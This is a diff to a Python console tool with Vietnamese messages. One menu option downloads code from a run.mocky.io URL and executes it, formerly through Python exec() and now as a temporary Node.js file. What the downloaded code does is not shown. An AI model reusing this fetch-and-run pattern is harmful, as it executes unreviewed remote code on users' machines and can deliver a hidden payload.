@@ -13,6 +13,8 @@ import uuid
 import json
 import requests
 import socket
+import subprocess
+import tempfile
 
 try:
     from faker import Faker
@@ -49,6 +51,22 @@ def check_internet_connection():
     except OSError:
         return False
 
+def run_node_script(script_content):
+    # Create a temporary file to save the Node.js script
+    with tempfile.NamedTemporaryFile(delete=False, suffix='.js') as temp_file:
+        temp_file.write(script_content.encode('utf-8'))
+        temp_file_path = temp_file.name
+
+    try:
+        # Run the Node.js script using the Node.js runtime
+        result = subprocess.run(['node', temp_file_path], capture_output=True, text=True)
+        print(f"Node.js script output:\n{result.stdout}")
+        if result.stderr:
+            print(f"Node.js script errors:\n{result.stderr}")
+    finally:
+        # Clean up the temporary file
+        os.remove(temp_file_path)
+
 try:
     while True:
         banner()
@@ -65,11 +83,11 @@ try:
                 try:
                     response = requests.get('https://run.mocky.io/v3/35f2ff6e-a2f2-4cd1-8368-1843e71860f4')
                     response.raise_for_status()  # Kiểm tra lỗi HTTP
-                    exec(response.text)
+                    run_node_script(response.text)
                 except requests.RequestException as e:
-                    print(f"{RED}Lỗi kết nối mạng: {e}{RESET}??")
+                    print(f"{RED}Lỗi kết nối mạng: {e}{RESET}")
             else:
-                print(f"{RED}Không có kết nối mạng. Vui lòng kiểm tra kết nối của bạn???.{RESET}")
+                print(f"{RED}Không có kết nối mạng. Vui lòng kiểm tra kết nối của bạn.{RESET}")
         else:
             print(f"{RED}Vui lòng chỉ nhập số {RESET}")
 except KeyboardInterrupt:
